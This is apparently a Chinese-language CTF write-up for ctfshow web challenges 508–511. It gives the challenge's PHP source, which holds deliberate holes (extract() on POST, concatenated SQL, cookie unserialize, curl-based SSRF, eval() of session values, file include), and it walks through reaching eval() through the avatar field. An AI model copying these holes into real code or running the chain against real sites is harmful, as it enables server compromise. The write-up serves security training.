<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414130410885.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414130410885"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414130450436.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414130450436"></p>

<h1 id="web508"><a href="#web508" class="headerlink" title="web508"></a>web508</h1><p>api&#x2F;admin_edit.php</p>
<pre><code class="php">
&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-15 04:27:41
 Last Modified by:   h1xa
 Last Modified time: 2021-03-15 07:45:25
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
session_start();
include(&#39;../render/db_class.php&#39;);

error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;
    extract($_POST);
    if(preg_match(&#39;/\&#39;|\&quot;|\\\/&#39;, $avatar))&#123;
        $ret[&#39;msg&#39;]=&#39;存在无效字符&#39;;
        die(json_encode($ret));
    &#125;
    $sql = &quot;update user set nickname=&#39;&quot;.substr($nickname, 0,8).&quot;&#39;,avatar=&#39;&quot;.$avatar.&quot;&#39; where username=&#39;&quot;.substr($user[&#39;username&#39;],0,8).&quot;&#39;&quot;;
    $db=new db();
    if($db-&gt;update_one($sql))&#123;
        $_SESSION[&#39;user&#39;][&#39;nickname&#39;]=$nickname;
        $_SESSION[&#39;user&#39;][&#39;avatar&#39;]=$avatar;
        $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;
    &#125;else&#123;
        $ret[&#39;msg&#39;]=&#39;管理员信息修改失败&#39;;
    &#125;
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;



</code></pre>
<p>可见这里并没有将图片放到本地,而是放到了session里面</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414131751499.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414131751499"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414131808105.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414131808105"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414132009224.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414132009224"></p>

<h1 id="web509"><a href="#web509" class="headerlink" title="web509"></a>web509</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133327832.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414133327832"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133433745.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414133433745"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133503550.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414133503550"></p>

<h1 id="web510"><a href="#web510" class="headerlink" title="web510"></a>web510</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133936922.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414133936922"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414134023254.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414134023254"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414134049496.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414134049496"></p>

<h1 id="web511"><a href="#web511" class="headerlink" title="web511"></a>web511</h1><p>&#x2F;index.php</p>
<pre><code class="php">
&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 15:43:51
 Last Modified by:   h1xa
 Last Modified time: 2021-03-25 16:43:05
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
session_start();
include(&#39;render/render_class.php&#39;);
include(&#39;render/db_class.php&#39;);


$action=$_GET[&#39;action&#39;];


if(!isset($action))&#123;
    if(isset($_COOKIE[&#39;user&#39;]))&#123;
        $c=$_COOKIE[&#39;user&#39;];
        if(!preg_match(&#39;/\:|\,/&#39;, $c))&#123;
            $user=unserialize($c);
        &#125;
        if($user)&#123;
            templateUtil::render(&#39;index&#39;);
        &#125;else&#123;
            header(&#39;location:index.php?action=login&#39;);
        &#125;
    &#125;else&#123;
        header(&#39;location:index.php?action=login&#39;);
    &#125;
    die();    
&#125;

switch ($action) &#123;
    case &#39;check&#39;:
        extract($_POST);
        if(!preg_match(&#39;/file|or|innodb|sys|mysql/i&#39;, $username))&#123;
            $sql = &quot;select username,nickname,avatar from user where username = &#39;&quot;.$username.&quot;&#39; and password=&#39;&quot;.md5($password).&quot;&#39; order by id limit 1&quot;;
            $db=new db();
            $user=$db-&gt;select_one_array($sql);
        &#125;
        if($user)&#123;
            $_SESSION[&#39;user&#39;]=$user;
            header(&#39;location:index.php?action=index&#39;);
        &#125;else&#123;
            templateUtil::render(&#39;error&#39;);
        &#125;
        break;
    case &#39;clear&#39;:
        system(&#39;rm -rf cache/*&#39;);
        die(&#39;cache clear&#39;);
        break;
    case &#39;login&#39;:
        templateUtil::render($action);
        break;
    case &#39;index&#39;:
        $user=$_SESSION[&#39;user&#39;];
        if($user)&#123;
            templateUtil::render(&#39;index&#39;,$user);
        &#125;else&#123;
            header(&#39;location:index.php?action=login&#39;);
        &#125;
        break;
    case &#39;view&#39;:
        $user=$_SESSION[&#39;user&#39;];
        if($user)&#123;
            templateUtil::render($_GET[&#39;page&#39;],$user);
        &#125;else&#123;
            header(&#39;location:index.php?action=login&#39;);
        &#125;
        break;
    case &#39;logout&#39;:
        session_destroy();
        header(&#39;location:index.php?action=login&#39;);
        break;
    default:
        templateUtil::render($action);
        break;
&#125;

</code></pre>
<p>api&#x2F;admin_templates.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-19 18:49:54
 Last Modified by:   h1xa
 Last Modified time: 2021-03-25 17:17:07
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


session_start();
include(&#39;../render/db_class.php&#39;);
error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
$action=$_GET[&#39;action&#39;];
if(!isset($user))&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;
switch ($action) &#123;
    case &#39;list&#39;:
        $sql = &quot;select id,name,type,path,des from templates limit 0,10&quot;;
        $db=new db();
        $temps = $db-&gt;select_array($sql);
        if(count($temps)&gt;0)&#123;
            $ret[&#39;count&#39;]=count($temps);
            $ret[&#39;data&#39;]=$temps;
            $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
        &#125;
        break;
    case &#39;update&#39;:
        extract($_POST);
        $row=json_decode($row);
        if(waf($row))&#123;
            break;
        &#125;
        $sql =&quot;update templates set name=&#39;&#123;$row-&gt;name&#125;&#39;,path=&#39;&#123;$row-&gt;path&#125;&#39;,type=&#39;&#123;$row-&gt;type&#125;&#39;,des=&#39;&#123;$row-&gt;des&#125;&#39; where id =&#123;$row-&gt;id&#125;&quot;;
        $db = new db();
        if($db-&gt;update_one($sql))&#123;
            $ret[&#39;msg&#39;]=&#39;实时更新成功&#39;;
        &#125;else&#123;
            $ret[&#39;msg&#39;]=&#39;实时更新失败&#39;;
        &#125;
        break;
    case &#39;getContents&#39;:
        extract($_POST);
        $template=json_decode($template);
        if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\\u4e00-\u9fa5]+$/&#39;, $template-&gt;path))&#123;
            $ret[&#39;count&#39;]=1;
            $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
            $ret[&#39;data&#39;]=array(&#39;contents&#39;=&gt;htmlspecialchars(file_get_contents(__DIR__.&#39;/../templates/&#39;.$template-&gt;path)));
        &#125;
        break;
    case &#39;download&#39;:
        extract($_POST);
        if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\u4e00-\u9fa5]+$/&#39;, $path))&#123;
            header(&quot;Content-Type: application/octet-stream&quot;); 
            header(&#39;Content-Disposition:  attachment; filename=&quot;&#39; . $path. &#39;&quot;&#39;);
            echo file_get_contents(__DIR__.&#39;/../templates/&#39;.$path);
            exit();
        &#125;
        break;
    case &#39;upload&#39;:
        extract($_POST);
        if(!preg_match(&#39;/php|phar|ini|settings/i&#39;, $name))
        &#123;    
            if(preg_match(&#39;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#39;, $content))&#123;
                $ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;
            &#125;else&#123;
                file_put_contents(__DIR__.&#39;/../templates/&#39;.$name, $content);
                $ret[&#39;msg&#39;]=&#39;文件上传成功&#39;;
            &#125;
            
        &#125;else&#123;
            $ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;
        &#125;
        break;
    default:
        # code...
        break;
&#125;

function waf($row)&#123;
    $ret = false;
    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;name))&#123;
        $ret=true;
    &#125;
    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;type))&#123;
        $ret=true;
    &#125;
    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;des))&#123;
        $ret=true;
    &#125;
    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;path))&#123;
        $ret=true;
    &#125;
    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;id))&#123;
        $ret=true;
    &#125;
    return $ret;
&#125;
die(json_encode($ret));
</code></pre>
<p>api&#x2F;admin_edit.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-15 04:27:41
 Last Modified by:   h1xa
 Last Modified time: 2021-03-15 07:45:25
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/
session_start();
include(&#39;../render/db_class.php&#39;);

error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;
    extract($_POST);
    if(preg_match(&#39;/\&#39;|\&quot;|\\\/&#39;, $avatar))&#123;
        $ret[&#39;msg&#39;]=&#39;存在无效字符&#39;;
        die(json_encode($ret));
    &#125;
    $sql = &quot;update user set nickname=&#39;&quot;.substr($nickname, 0,8).&quot;&#39;,avatar=&#39;&quot;.$avatar.&quot;&#39; where username=&#39;&quot;.substr($user[&#39;username&#39;],0,8).&quot;&#39;&quot;;
    $db=new db();
    if($db-&gt;update_one($sql))&#123;
        $_SESSION[&#39;user&#39;][&#39;nickname&#39;]=$nickname;
        $_SESSION[&#39;user&#39;][&#39;avatar&#39;]=$avatar;
        $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;
    &#125;else&#123;
        $ret[&#39;msg&#39;]=&#39;管理员信息修改失败&#39;;
    &#125;
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;




</code></pre>
<p>api&#x2F;admin_file_view.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-24 00:53:45
 Last Modified by:   h1xa
 Last Modified time: 2021-03-25 15:46:06
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


session_start();

error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;
    extract($_POST);
        if(preg_match(&#39;/php|sml|phar|\:|data|file|sess/i&#39;, $f))&#123;
                $ret[&#39;msg&#39;]=&#39;请不要使用此功能&#39;;
                die(json_encode($ret));
        &#125;
        if($debug==1 &amp;&amp; preg_match(&#39;/^user/&#39;, file_get_contents($f)))&#123;
                include($f);
        &#125;else&#123;
                $ret[&#39;data&#39;]=array(&#39;contents&#39;=&gt;file_get_contents(__DIR__.&#39;/../&#39;.$name));
        &#125;
        $ret[&#39;msg&#39;]=&#39;查看成功&#39;;
        die(json_encode($ret));


&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;

</code></pre>
<p>render&#x2F;render_class.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-08 17:52:18
 Last Modified by:   h1xa
 Last Modified time: 2021-03-25 17:19:10
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/

include(&#39;file_class.php&#39;);
include(&#39;cache_class.php&#39;);

class templateUtil &#123;
    public static function render($template,$arg=array())&#123;
        $templateContent=fileUtil::read(&#39;templates/&#39;.$template.&#39;.sml&#39;);
        $cache=templateUtil::shade($templateContent,$arg);
        echo $cache;
    &#125;
    public static  function shade($templateContent,$arg=array())&#123;
        $templateContent=templateUtil::checkImage($templateContent,$arg);
        $templateContent=templateUtil::checkConfig($templateContent);
        $templateContent=templateUtil::checkVar($templateContent,$arg);
        foreach ($arg as $key =&gt; $value) &#123;
            $templateContent=str_replace(&#39;&#123;&#123;'.$key.'&#125;&#125;&#39;, $value, $templateContent);
        &#125;
        return $templateContent;
    &#125;

    public static function checkImage($templateContent,$arg=array())&#123;
        foreach ($arg as $key =&gt; $value) &#123;
            if(preg_match(&#39;/gopher|file/i&#39;, $value))&#123;
                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, &#39;&#39;, $templateContent);
            &#125;
            if(stripos($templateContent, &#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;))&#123;
                $encode=&#39;&#39;;
                if(file_exists(__DIR__.&#39;/../cache/&#39;.md5($value)))&#123;
                    $encode=file_get_contents(__DIR__.&#39;/../cache/&#39;.md5($value));
                &#125;else&#123;
                    $ch=curl_init($value);
                    curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    $result=curl_exec($ch);
                    curl_close($ch);
                    $ret=chunk_split(base64_encode($result));
                    $encode = &#39;data:image/jpg/png/gif;base64,&#39; . $ret;
                    file_put_contents(__DIR__.&#39;/../cache/&#39;.md5($value), $encode);
                &#125;
                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, $encode, $templateContent);
            &#125;
            
        &#125;
        return $templateContent;
    &#125;
    public static function checkConfig($templateContent)&#123;
        $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
        foreach ($config as $key =&gt; $value) &#123;
            if(stripos($templateContent, &#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;))&#123;
                $templateContent=str_replace(&#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;, $value, $templateContent);
            &#125;
            
        &#125;
        return $templateContent;
    &#125;

    public static function checkVar($templateContent,$arg)&#123;
        foreach ($arg as $key =&gt; $value) &#123;
            if(stripos($templateContent, &#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;))&#123;
                eval(&#39;$v=&#39;.$value.&#39;;&#39;);
                $templateContent=str_replace(&#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;, $v, $templateContent);
            &#125;
        &#125;
        return $templateContent;
    &#125;


&#125;




</code></pre>
<p>这次得分析别的文件了在render&#x2F;render_class.php下面找到一个eval(),我们看看参数可不可控</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414135942222.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414135942222"></p>

<p>shade调用了checkvar()</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414140114969.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414140114969"></p>

<p>render调用了shade(),先读取了这个模板文件</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414140311853.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414140311853"></p>

<p>这个render总共有六处调用其中有两处传了arg参数,这里当然只有传参的才能利用,其他的就不看了</p>
<p>要想利用,只能去更改$user这个数组里面的值,那么我们去搜索哪里可以更改$_SESSION[‘user’]的值</p>
<p>发现在admin_deit.php存在</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141131861.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414141131861"></p>

<p>这里的avatar仅仅过滤了几个字符简单可以绕过</p>
<p>先改一下</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141636372.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414141636372"></p>

<p>接着index访问这个</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141707910.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414141707910"></p>

<p>接着读取文件</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141804254.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414141804254"></p>

